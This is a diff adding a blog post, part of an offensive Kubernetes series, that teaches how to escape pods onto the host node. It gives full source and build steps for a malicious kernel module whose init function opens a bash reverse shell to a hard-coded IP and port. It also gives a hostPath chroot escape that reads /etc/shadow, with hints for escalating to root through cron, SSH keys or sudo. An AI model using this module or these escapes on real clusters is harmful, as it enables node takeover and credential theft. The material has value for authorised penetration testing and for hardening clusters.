@@ -1,0 +1,152 @@
+---
+title: "Kubernetes pod escapes: capabilities and hostPath mounts"
+description: "Escape Kubernetes pods to the host using SYS_MODULE kernel module loading and hostPath volume chroot techniques."
+date: 2025-12-22
+seriesSlug: "kubernetes-offensive"
+seriesTitle: "Attacking Kubernetes"
+seriesPart: 7
+seriesDescription: "Offensive Kubernetes: recon through RBAC abuse, pod escapes, persistence, and cloud pivot."
+tags: ["kubernetes", "container-escape", "linux", "kubernetes-offensive"]
+---
+
+Cluster access gets you pods. Some pod configurations get you the **node**. Two paths I use regularly: dangerous Linux capabilities (especially `CAP_SYS_MODULE`) and `hostPath` mounts of the host filesystem.
+
+## Path A: CAP_SYS_MODULE kernel module load
+
+Enumerate pods in the target namespace:
+
+```bash
+kubectl --kubeconfig=initial_kubeconfig.yaml get pods -n privilege-escalation
+kubectl --kubeconfig=initial_kubeconfig.yaml get pods -n privilege-escalation -o wide
+```
+
+Exec into the target:
+
+```bash
+kubectl --kubeconfig=initial_kubeconfig.yaml exec -it \
+  sysmodule-escape-7bdjajewdjsada-xddf \
+  -n privilege-escalation -- /bin/bash
+```
+
+Inside the pod:
+
+```bash
+capsh --print
+ifconfig
+```
+
+Look for `cap_sys_module` in the bounding set.
+
+```
+Pod (CAP_SYS_MODULE) → insmod malicious.ko → kernel runs payload → reverse shell on NODE
+```
+
+### Malicious kernel module (lab only)
+
+`rev.c`:
+
+```c
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kmod.h>
+
+MODULE_LICENSE("GPL");
+
+static int start_shell(void) {
+    char *argv[] = {"/bin/bash", "-c",
+        "bash -i >& /dev/tcp/10.13.81.123/1337 0>&1", NULL};
+    static char *envp[] = {
+        "HOME=/", "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+static int __init init_mod(void) { return start_shell(); }
+static void __exit exit_mod(void) { }
+
+module_init(init_mod);
+module_exit(exit_mod);
+```
+
+`Makefile`:
+
+```makefile
+obj-m += rev.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+Build and load inside the pod (needs kernel headers matching the **node** kernel):
+
+```bash
+make
+insmod rev.ko
+```
+
+Reverse shell lands on your listener. You are executing code in kernel context on the worker node, not inside the container namespace.
+
+This requires the pod to run privileged enough to load modules. Modern Pod Security Standards block this. Legacy clusters and CTF labs still have it.
+
+## Path B: hostPath mount escape
+
+Find pods with host mounts:
+
+```bash
+kubectl --kubeconfig=privesc-kubeconfig.yaml get pods -n privilege-escalation -o yaml | grep -A5 hostPath
+```
+
+Exec in:
+
+```bash
+kubectl --kubeconfig=initial_kubeconfig.yaml exec -it \
+  hostpath-escape-7bdjajewdjsada-xddf \
+  -n privilege-escalation -- /bin/bash
+```
+
+```
+Pod sees /host/  →  chroot /host  →  full host filesystem
+```
+
+Enumerate mounts:
+
+```bash
+cat /proc/mounts
+mount
+```
+
+If the host root is mounted at `/host`:
+
+```bash
+cd /host
+chroot /host bash
+ls /
+cat /etc/shadow
+```
+
+You now have a shell with host filesystem context. Escalate to root on the host via cron, SSH keys, or misconfigured sudo.
+
+## Comparison
+
+| Technique | Pod requirement | Host impact |
+|-----------|-----------------|-------------|
+| CAP_SYS_MODULE | `privileged: true` or capability add | Kernel-level code execution |
+| hostPath `/` | Volume mount of `/` or `/var/lib/kubelet` | Filesystem read/write on node |
+| Docker socket mount | `/var/run/docker.sock` in pod | Create privileged containers |
+
+## Recon tip
+
+When listing pods from kubelet or API, grep for:
+
+```bash
+# in pod spec JSON/YAML
+"hostPath"
+"privileged": true
+"capabilities"
+"/var/run/docker.sock"
+```
+
+These are your escape candidates before you even have a shell.
+
+Next: RBAC misconfigurations for namespace pivot, impersonation, and cluster-admin abuse.
